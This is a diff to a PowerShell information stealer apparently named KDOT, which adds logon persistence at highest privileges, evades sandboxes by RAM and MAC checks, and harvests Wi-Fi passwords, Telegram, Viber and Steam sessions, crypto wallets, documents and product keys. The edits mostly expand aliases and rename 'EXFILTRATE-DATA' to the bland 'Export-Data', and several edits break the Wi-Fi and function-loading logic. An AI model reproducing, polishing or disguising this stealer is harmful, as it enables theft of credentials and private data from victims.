@@ -43,7 +43,7 @@ function Invoke-ANTITOTAL {
     
     for ($i = 0; $i -lt $urls.Count; $i++) {
         $url = $urls[$i]
-        $functionName = $functions[$i]
+        $functions[$i]
         
         $result = Invoke-WebRequest -Uri $url -UseBasicParsing
         if ($result.StatusCode -eq 200) {
@@ -139,7 +139,7 @@ function make_error_page {
 }
 
 function ram_check {
-    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % {[Math]::Round(($_.Sum / 1GB),2)}
+    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {[Math]::Round(($_.Sum / 1GB),2)}
     if ($ram -lt 6) {
         make_error_page "RAM CHECK FAILED"
         Start-Sleep -s 3
@@ -160,7 +160,7 @@ function Invoke-TASKS {
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
-    EXFILTRATE-DATA
+    Export-Data
 }
 
 function Request-Admin {
@@ -177,7 +177,7 @@ function Request-Admin {
     }
 }
 
-function EXFILTRATE-DATA {
+function Export-Data {
     $folder_general = "$env:APPDATA\KDOT\DATA"
     $folder_messaging = "$env:APPDATA\KDOT\DATA\Messaging"
     $folder_gaming = "$env:APPDATA\KDOT\DATA\Gaming"
@@ -212,9 +212,9 @@ function EXFILTRATE-DATA {
     $gpu = (Get-WmiObject Win32_VideoController).Name 
     $gpu > $folder_general\GPU.txt
     $format = " GB"
-    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
+    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
     $raminfo = "$total" + "$format"  
-    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
+    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
     $mac > $folder_general\mac.txt
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
@@ -223,9 +223,9 @@ function EXFILTRATE-DATA {
     #end of bulk data
 
     $uptime = Get-Uptime
-    $avlist = get-installed-av -autosize | ft | out-string
+    $avlist = get-installed-av -autosize | Format-Table | out-string
 
-    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
+    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
     $wifi > $folder_general\WIFIPasswords.txt
 
@@ -236,10 +236,10 @@ function EXFILTRATE-DATA {
 
     #misc data
     Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $folder_general\StartUpApps.txt
-    Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $folder_general\running-services.txt
-    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $folder_general\running-applications.txt
+    Get-WmiObject win32_service |Where-Object State -match "running" | Select-Object Name, DisplayName, PathName, User | Sort-Object Name | Format-Table -wrap -autosize >  $folder_general\running-services.txt
+    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | Format-Table -wrap -autosize > $folder_general\running-applications.txt
     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $folder_general\Installed-Applications.txt
-    Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $folder_general\NetworkAdapters.txt
+    Get-NetAdapter | Format-Table Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $folder_general\NetworkAdapters.txt
 
     #messaging
     Invoke-telegramstealer
@@ -262,7 +262,7 @@ function EXFILTRATE-DATA {
 
     #other stuff
 
-    $alldiskinfo = diskdata | ft -wrap -autosize
+    $alldiskinfo = diskdata | Format-Table -wrap -autosize
     $alldiskinfo > $folder_general\diskinfo.txt
 
     Get-ProductKey > $folder_general\productkey.txt
@@ -609,8 +609,8 @@ Function Invoke-GrabFiles {
     )
     $dest = $important_files
     $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
-    [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
-    (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
+    [regex] $grab_regex = "(" + (($grabber |ForEach-Object {[regex]::escape($_)}) -join "|") + ")"
+    (Get-ChildItem -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | Where-Object Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
 }
 
 function Get-ProductKey {
@@ -715,7 +715,7 @@ function Invoke-viberstealer {
     New-Item -ItemType Directory -Force -Path $viber_session
     $configfiles = @("config$1")
     foreach($file in $configfiles) {
-        Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $viber_session }
+        Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $viber_session }
     }
     $pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
     $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
@@ -759,7 +759,7 @@ function Invoke-steamstealer {
     Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
     $ssfnfiles = @("ssfn$1")
     foreach($file in $ssfnfiles) {
-        Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
+        Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
     }
 }
 
@@ -902,7 +902,7 @@ function Invoke-Crypto_Wallets {
 }
 
 function Search-Mac ($mac_addresses) {
-    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
+    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
     ForEach ($mac123 in $mac_addresses) {
         if ($pc_mac -contains $mac123) {
             return $true
